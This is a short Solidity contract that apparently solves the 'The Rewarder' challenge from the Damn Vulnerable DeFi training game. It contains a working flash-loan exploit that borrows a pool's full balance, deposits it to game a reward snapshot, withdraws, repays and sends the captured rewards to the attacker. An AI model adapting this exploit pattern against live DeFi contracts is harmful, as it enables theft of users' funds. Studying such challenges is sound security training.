// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";

contract TheRewarderHack {

    TheRewarderPool rewarderPool;
    FlashLoanerPool flashLoanerPool;
    DamnValuableToken rewardToken;
    DamnValuableToken dvtToken;
    address public owner;

    constructor(TheRewarderPool rewarderPool_, FlashLoanerPool flashLoanerPool_, DamnValuableToken dvt_, DamnValuableToken rewardToken_) {
        rewarderPool = rewarderPool_;
        flashLoanerPool = flashLoanerPool_;
        rewardToken = rewardToken_;
        dvtToken = dvt_;
        owner = msg.sender;
    }

    function attack() external {
        uint balance = dvtToken.balanceOf(address(flashLoanerPool));
        flashLoanerPool.flashLoan(balance);
    }

    function receiveFlashLoan(uint256 amount) external {
        dvtToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.distributeRewards();
        rewarderPool.withdraw(amount);
        dvtToken.transfer(address(flashLoanerPool), amount);
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }
}